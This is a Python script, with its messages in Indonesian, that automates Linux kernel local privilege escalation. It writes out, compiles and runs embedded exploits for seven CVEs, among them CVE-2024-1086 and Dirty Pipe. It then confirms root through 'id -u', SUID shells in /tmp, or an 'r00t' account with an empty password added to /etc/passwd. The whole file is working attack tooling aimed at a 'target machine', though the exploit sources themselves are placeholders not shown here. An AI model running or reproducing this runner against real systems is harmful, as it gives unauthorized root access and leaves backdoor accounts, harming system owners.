def _compile(cve_id, workdir, verbose):
    """Kompilasi exploit. Return (ok, bin_path, msg)."""
    w = workdir
    nftdir = os.path.join(w, "1086")  # dir hasil ekstrak blob 1086 (berisi libmnl/, libnftnl/, lib/, src/)
    d = CVE_REGISTRY[cve_id]
    verbose_flag = "-v" if verbose else ""
    flags = "-w"
    if cve_id == "0847":
        src = os.path.join(w, "0847", "dirtypipez.c")
        binp = os.path.join(w, "0847", "exp0847")
        cmd = ["gcc", "-O2", flags, "-o", binp, src]
    elif cve_id == "22555":
        src = os.path.join(w, "22555", "cve2021_22555.c")
        binp = os.path.join(w, "22555", "exp22555")
        cmd = ["gcc", "-O2", flags, "-o", binp, src]
    elif cve_id == "2586":
        src = os.path.join(w, "2586", "cve2022_2586_aels.c")
        binp = os.path.join(w, "2586", "exp2586")
        cmd = ["gcc", "-O2", "-D_GNU_SOURCE", flags, "-Wno-deprecated-declarations",
               "-include", "arpa/inet.h", "-I", nftdir, src, "-o", binp,
               "-no-pie", "-lpthread",
               os.path.join(nftdir, "lib", "libnftnl.a"),
               os.path.join(nftdir, "lib", "libmnl.a")]
    elif cve_id == "32250":
        src = os.path.join(w, "32250", "cve2022_32250.c")
        binp = os.path.join(w, "32250", "exp32250")
        cmd = ["gcc", "-O2", "-D_GNU_SOURCE", flags, "-Wno-deprecated-declarations",
               "-Wno-implicit-function-declaration",
               "-include", "arpa/inet.h", "-include", "limits.h",
               "-I", nftdir, src, "-o", binp, "-lpthread",
               os.path.join(nftdir, "lib", "libnftnl.a"),
               os.path.join(nftdir, "lib", "libmnl.a")]
    elif cve_id == "0386":
        src = os.path.join(w, "0386", "cve2023_0386_unified.c")
        binp = os.path.join(w, "0386", "exp0386")
        fuse3 = os.path.isdir("/usr/include/fuse3")
        if fuse3:
            cmd = ["gcc", "-O2", flags, "-D_FILE_OFFSET_BITS=64",
                   "-DFUSE_USE_VERSION=31", "-I/usr/include/fuse3",
                   src, "-o", binp, "-lfuse3", "-lpthread"]
        else:
            cmd = ["gcc", "-O2", flags, "-DFUSE_USE_VERSION=26",
                   src, "-o", binp, "-lfuse", "-lpthread"]
    elif cve_id == "0995":
        d0995 = os.path.join(w, "0995")
        binp = os.path.join(d0995, "exp0995")
        base = ["gcc", "-O2", flags,
                os.path.join(d0995, "exploit.c"), os.path.join(d0995, "util.c"),
                "-o", binp, "-no-pie"]
        cmd = base + ["-static"]
    elif cve_id == "1086":
        binp = os.path.join(nftdir, "exp1086")
        cmd = ["gcc", "-std=gnu11", "-O2", "-D_GNU_SOURCE", flags,
               "-Wno-deprecated-declarations", "-Wno-implicit-function-declaration",
               "-I", nftdir,
               os.path.join(nftdir, "src", "main.c"),
               os.path.join(nftdir, "src", "env.c"),
               os.path.join(nftdir, "src", "net.c"),
               os.path.join(nftdir, "src", "nftnl.c"),
               os.path.join(nftdir, "src", "file.c"),
               os.path.join(nftdir, "lib", "libnftnl.a"),
               os.path.join(nftdir, "lib", "libmnl.a"),
               "-o", binp]
    else:
        return False, None, "CVE tidak dikenal"

    # Coba kompilasi utama; fallback untuk 0995 bila libc statis tidak ada
    attempts = [cmd]
    if cve_id == "0995":
        attempts.append(base)  # tanpa -static
    last_err = ""
    for a in attempts:
        try:
            r = subprocess.run(a, cwd=w, capture_output=True, timeout=120)
        except Exception as e:
            last_err = str(e)
            continue
        if r.returncode == 0 and os.path.exists(binp):
            return True, binp, ""
        last_err = (r.stderr or r.stdout or b"").decode("utf-8", "replace")[-1500:]
    return False, None, f"kompilasi gagal: {last_err}"


def _run_exploit(cve_id, workdir, verbose):
    d = CVE_REGISTRY[cve_id]
    cwd = os.path.join(workdir, d["blob"])  # binary dikompilasi di subdir CVE
    argv = list(d["argv"])
    if cve_id == "0386":
        argv = [os.path.join(workdir, "0386", "exp0386"), workdir]
    if cve_id == "0847":
        suid = _find_suid_bin()
        argv = [os.path.join(workdir, "0847", "exp0847"), suid]
    try:
        r = subprocess.run(
            argv, cwd=cwd, input=d["stdin"],
            capture_output=True, timeout=d["timeout"],
        )
        out = (r.stdout or b"") + (r.stderr or b"")
    except subprocess.TimeoutExpired as e:
        out = ((e.stdout or b"") + (e.stderr or b""))
        return False, out, "timeout (proses dihentikan)"
    except Exception as e:
        return False, b"", str(e)
    return True, out, ""


def _verify_root(cve_id, workdir, out):
    """Verifikasi: baris '0' dari `id -u` + cek artefak spesifik CVE."""
    lines = [ln.strip() for ln in out.decode("utf-8", "replace").splitlines()]
    id0 = any(ln == "0" for ln in lines)
    artifact_ok = True
    notes = []
    if cve_id == "0847":
        if not _is_suid("/tmp/sh"):
            artifact_ok = False
            notes.append("/tmp/sh tidak SUID")
        else:
            notes.append("/tmp/sh SUID ditemukan")
    elif cve_id == "2586":
        try:
            with open("/etc/passwd", "r", errors="replace") as f:
                if "r00t:" not in f.read():
                    artifact_ok = False
                    notes.append("entri r00t tidak ada di /etc/passwd")
                else:
                    notes.append("entri r00t ditemukan di /etc/passwd")
        except OSError as e:
            artifact_ok = False
            notes.append(f"tidak bisa baca /etc/passwd: {e}")
    elif cve_id == "32250":
        if not _is_suid("/tmp/shell"):
            artifact_ok = False
            notes.append("/tmp/shell tidak SUID")
        else:
            notes.append("/tmp/shell SUID ditemukan")
    elif cve_id == "0386":
        hello = os.path.join(workdir, "updir", "hello")
        if not _is_suid(hello):
            artifact_ok = False
            notes.append(f"{hello} tidak SUID")
        else:
            notes.append("updir/hello SUID ditemukan")
    elif cve_id == "22555":
        if "[+] Root privileges gained." not in out.decode("utf-8", "replace"):
            notes.append("marker 'Root privileges gained' tidak muncul (tetap cek id -u)")
    if not id0:
        notes.append("id -u tidak mengembalikan 0")
    return id0 and artifact_ok, notes


def _prepare(cve_id, workdir):
    """Tulis source / ekstrak blob ke workdir. Return True/False + msg."""
    w = workdir
    try:
        if cve_id == "0847":
            _write_source(SRC_0847, os.path.join(w, "0847", "dirtypipez.c"))
        elif cve_id == "22555":
            _write_source(SRC_22555, os.path.join(w, "22555", "cve2021_22555.c"))
        elif cve_id == "2586":
            _write_source(SRC_2586, os.path.join(w, "2586", "cve2022_2586_aels.c"))
        elif cve_id == "32250":
            _write_source(SRC_32250, os.path.join(w, "32250", "cve2022_32250.c"))
        elif cve_id == "0386":
            _write_source(SRC_0386, os.path.join(w, "0386", "cve2023_0386_unified.c"))
        elif cve_id == "1086":
            _extract_blob(BLOB_1086, w)
        elif cve_id == "0995":
            _extract_blob(BLOB_0995, os.path.join(w, "0995"))
        return True, ""
    except Exception as e:
        return False, f"gagal menyiapkan source: {e}"


def cleanup(workdir):
    # Lepas mountpoint FUSE/overlay yang mungkin tersisa (mis. dari CVE-2023-0386)
    for sub in ("testfuse", "overlaydir"):
        mp = os.path.join(workdir, sub) if workdir else sub
        try:
            if os.path.ismount(mp):
                for cmd in (["fusermount3", "-u", mp],
                            ["fusermount", "-u", mp],
                            ["umount", "-l", mp]):
                    try:
                        subprocess.run(cmd, capture_output=True, timeout=5)
                    except Exception:
                        pass
        except OSError:
            pass
    # Bunuh proses anak yatim (fuse daemon, shell sisa) yang masih memakai workdir
    if workdir:
        try:
            subprocess.run(["pkill", "-9", "-f", workdir],
                           capture_output=True, timeout=5)
        except Exception:
            pass
    for p in ["/tmp/sh", "/tmp/shell", "/tmp/shell.c", "/tmp/dummy",
              "/tmp/p", "/tmp/x", "/tmp/modprobe", "/tmp/modprobe.sh"]:
        try:
            if os.path.isfile(p) or os.path.islink(p):
                os.unlink(p)
        except OSError:
            pass
    if workdir and os.path.isdir(workdir):
        shutil.rmtree(workdir, ignore_errors=True)


def run_all(args):
    if (not args.get("force") and not args.get("compile_only")
            and os.geteuid() == 0):
        warn("Anda berjalan sebagai root (euid=0) — eksploit LPE tidak diperlukan.")
        warn("Gunakan --force untuk tetap menguji kompilasi/run (uji/CI), "
             "atau jalankan sebagai user non-root di mesin target.")
        return 0

    print(f"{BOLD}{'=' * 62}{RESET}")
    print(f"{BOLD}  POC LinPE6 All-in-One — Kernel LPE Runner{RESET}")
    print(f"  CVE-2024-1086 | CVE-2022-2586 | CVE-2022-32250 | CVE-2023-0386")
    print(f"  CVE-2022-0847 | CVE-2022-0995 | CVE-2021-22555")
    print(f"{BOLD}{'=' * 62}{RESET}")

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        fail(f"Arsitektur {arch} tidak didukung (butuh x86_64).")
        return 1
    if not _has_gcc():
        fail("gcc tidak ditemukan (butuh untuk mengompilasi exploit).")
        return 1

    kinfo = _kernel_info()
    if kinfo:
        info(f"Kernel: {kinfo['release']} (major={kinfo['major']}, minor={kinfo['minor']}, "
             f"effective={kinfo['effective']})")
    else:
        warn(f"Format release kernel tidak dikenali: {os.uname().release}; gate versi dilewati.")
        kinfo = None

    only = args.get("only")
    ids = [c for c in CVE_ORDER if only is None or c == only]
    if only and not ids:
        fail(f"--only tidak dikenal: {only} (pilihan: {', '.join(CVE_ORDER)})")
        return 1

    workdir = tempfile.mkdtemp(prefix=".lpe6_", dir="/tmp")
    info(f"Direktori kerja: {workdir}")
    confirmed = []
    failed = []

    for cve_id in ids:
        d = CVE_REGISTRY[cve_id]
        head(f"{d['name']} — {d['desc']}")

        # 1) Gate kernel (advisory)
        nogate = os.environ.get("LPE6_NOGATE") == "1"
        if kinfo and d["gate"] and not nogate:
            g_ok, g_reason = d["gate"](kinfo["ver"], kinfo["effective"])
            if not g_ok:
                warn(f"{d['name']} dilewati: gate kernel tidak terpenuhi ({g_reason}). "
                     "Tetap bisa dicoba dengan verifikasi manual.")
                failed.append((cve_id, "gate kernel tidak terpenuhi"))
                continue

        # 2) Prasyarat
        prereq_bad = None
        for fn in d["prereq"]:
            okp, msgp = fn()
            if not okp:
                prereq_bad = msgp
                break
        if prereq_bad:
            warn(f"{d['name']} dilewati: prasyarat gagal — {prereq_bad}.")
            failed.append((cve_id, f"prasyarat: {prereq_bad}"))
            continue

        # 3) Siapkan source
        p_ok, p_msg = _prepare(cve_id, workdir)
        if not p_ok:
            fail(f"{d['name']} FAILED — {p_msg}")
            failed.append((cve_id, p_msg))
            continue

        # 4) Kompilasi
        info(f"{d['name']}: mengompilasi exploit...")
        c_ok, binp, c_msg = _compile(cve_id, workdir, args.get("verbose"))
        if not c_ok:
            fail(f"{d['name']} FAILED — {c_msg}")
            failed.append((cve_id, c_msg))
            continue
        ok(f"{d['name']}: kompilasi berhasil ({os.path.basename(binp)})")
        if args.get("compile_only"):
            continue

        # 5) Jalankan
        info(f"{d['name']}: menjalankan exploit (timeout {d['timeout']}s)...")
        r_ok, out, r_msg = _run_exploit(cve_id, workdir, args.get("verbose"))
        if not r_ok:
            fail(f"{d['name']} FAILED — {r_msg}")
            failed.append((cve_id, r_msg))
            if args.get("verbose"):
                print(out.decode("utf-8", "replace")[-3000:])
            continue

        # 6) Verifikasi root
        v_ok, v_notes = _verify_root(cve_id, workdir, out)
        if args.get("verbose") or (v_ok and args.get("verbose")):
            print(out.decode("utf-8", "replace")[-4000:])
        if v_ok:
            ok(f"{d['name']} ROOT CONFIRMED (euid=0, id -u -> 0)")
            for n in v_notes:
                info(f"{d['name']}: {n}")
            confirmed.append(cve_id)
        else:
            reason = "; ".join(v_notes) if v_notes else "id -u tidak mengembalikan 0"
            fail(f"{d['name']} FAILED — verifikasi root gagal ({reason})")
            failed.append((cve_id, f"verifikasi: {reason}"))

    # Ringkasan
    head("RINGKASAN")
    if confirmed:
        for c in confirmed:
            ok(f"{CVE_REGISTRY[c]['name']}: ROOT CONFIRMED")
    else:
        warn("Tidak ada CVE yang berhasil (ROOT CONFIRMED = 0).")
    if failed:
        for c, why in failed:
            warn(f"{CVE_REGISTRY[c]['name']}: FAILED/lewat — {why}")

    if "2586" in confirmed:
        warn("CVE-2022-2586 menambahkan entri 'r00t' ke /etc/passwd "
             "(password kosong). Hapus manual sebagai root setelah pengujian: "
             "sed -i '/^r00t:/d' /etc/passwd")
    if "2586" in confirmed or "32250" in confirmed:
        warn("modprobe_path kernel telah diubah oleh exploit; kembali normal setelah reboot.")

    if not args.get("keep"):
        cleanup(workdir)
        info("Bersih-bersih selesai (artefak /tmp & direktori kerja dihapus).")
    else:
        info(f"--keep: artefak dipertahankan di {workdir}")

    if args.get("compile_only"):
        bad = [w for c, w in failed
               if w.startswith("kompilasi") or w.startswith("gagal menyiapkan")]
        if bad:
            return 1
        return 0 if ids else 1
    return 0 if confirmed else 1


def cmd_list():
    kinfo = _kernel_info()
    print(f"{BOLD}{'=' * 62}{RESET}")
    print(f"{BOLD}  Daftar CVE + gate kernel{RESET}")
    print(f"{BOLD}{'=' * 62}{RESET}")
    if kinfo:
        print(f"Kernel saat ini: {kinfo['release']} (ver={kinfo['ver']}, eff={kinfo['effective']})")
    else:
        print(f"Kernel saat ini: {os.uname().release} (format tidak dikenali)")
    for c in CVE_ORDER:
        d = CVE_REGISTRY[c]
        status = "-"
        if kinfo and d["gate"]:
            g_ok, g_reason = d["gate"](kinfo["ver"], kinfo["effective"])
            status = "LULUS" if g_ok else f"TIDAK ({g_reason})"
        elif not d["gate"]:
            status = "generik (tanpa gate)"
        print(f"  {d['name']:16s} gate: {status}")
        print(f"      {d['desc']}")
    return 0


def main(argv):
    import argparse
    ap = argparse.ArgumentParser(
        description="All-in-one Linux kernel LPE runner (x86_64). "
                    "Output dalam Bahasa Indonesia; verifikasi root via id -u == 0.",
        epilog="Contoh: python3 poc_linpe6_allinone.py --only 0847 --keep --verbose",
    )
    ap.add_argument("--only", metavar="CVE", default=None,
                    help="hanya jalankan CVE tertentu: " + ", ".join(CVE_ORDER))
    ap.add_argument("--list", action="store_true", help="tampilkan daftar CVE + gate kernel")
    ap.add_argument("--compile-only", action="store_true",
                    help="hanya kompilasi exploit yang memenuhi gate (tanpa menjalankan)")
    ap.add_argument("--keep", action="store_true",
                    help="pertahankan artefak & direktori kerja setelah selesai")
    ap.add_argument("--verbose", action="store_true", help="tampilkan output mentah exploit")
    ap.add_argument("--force", action="store_true",
                    help="tetap lanjut walau euid==0 (untuk uji/CI)")
    args = vars(ap.parse_args(argv))

    if args["list"]:
        return cmd_list()

    if args["only"] is not None and args["only"] not in CVE_ORDER:
        fail(f"--only tidak dikenal: {args['only']} "
             f"(pilihan: {', '.join(CVE_ORDER)})")
        return 1

    # Validasi blob tersemat benar (cek panjang placeholder)
    for name, val in [("BLOB_1086", BLOB_1086), ("BLOB_0995", BLOB_0995),
                      ("SRC_0847", SRC_0847), ("SRC_22555", SRC_22555),
                      ("SRC_2586", SRC_2586), ("SRC_32250", SRC_32250),
                      ("SRC_0386", SRC_0386)]:
        if val.startswith("__") and val.endswith("__"):
            fail(f"Blob tersemat {name} belum di-generate (file ini harus dibangun "
                 "oleh builder).")
            return 1
    return run_all(args)


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))